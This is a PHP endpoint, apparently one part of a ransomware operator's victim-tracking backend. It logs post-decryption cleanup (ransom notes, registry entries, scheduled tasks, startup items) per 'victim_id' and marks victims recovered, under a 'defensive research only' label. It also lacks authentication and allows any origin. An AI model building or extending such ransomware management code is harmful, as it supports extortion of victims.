<?php
/**
 * System Cleanup Notification API
 * Receives cleanup status from decryption process
 * For defensive cybersecurity research purposes only
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

require_once '../database.php';

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception("Only POST method allowed");
    }
    
    $victim_id = $_POST['victim_id'] ?? '';
    $notes_removed = intval($_POST['notes_removed'] ?? 0);
    $registry_cleaned = intval($_POST['registry_cleaned'] ?? 0);
    $tasks_removed = intval($_POST['tasks_removed'] ?? 0);
    $startup_cleaned = intval($_POST['startup_cleaned'] ?? 0);
    
    if (empty($victim_id)) {
        throw new Exception("Missing victim_id parameter");
    }
    
    $db = new Database();
    
    // Update cleanup status
    $cleanup_data = [
        'ransom_notes_removed' => $notes_removed,
        'registry_entries_cleaned' => $registry_cleaned,
        'scheduled_tasks_removed' => $tasks_removed,
        'startup_entries_cleaned' => $startup_cleaned,
        'cleanup_completed_at' => date('Y-m-d H:i:s'),
        'total_items_cleaned' => $notes_removed + $registry_cleaned + $tasks_removed + $startup_cleaned
    ];
    
    $db->updateDecryptionStatus($victim_id, 'system_cleanup_completed', $cleanup_data);
    
    // Update victim final status
    $db->updateVictimStatus($victim_id, 'fully_recovered');
    
    error_log("System cleanup completed for victim $victim_id: " . json_encode($cleanup_data));
    
    echo json_encode([
        'success' => true,
        'message' => 'System cleanup logged successfully',
        'victim_id' => $victim_id,
        'cleanup_summary' => $cleanup_data,
        'timestamp' => time()
    ]);
    
} catch (Exception $e) {
    error_log("Cleanup notification error: " . $e->getMessage());
    
    echo json_encode([
        'success' => false,
        'error' => 'Cleanup notification system error',
        'details' => $e->getMessage(),
        'timestamp' => time()
    ]);
}
?>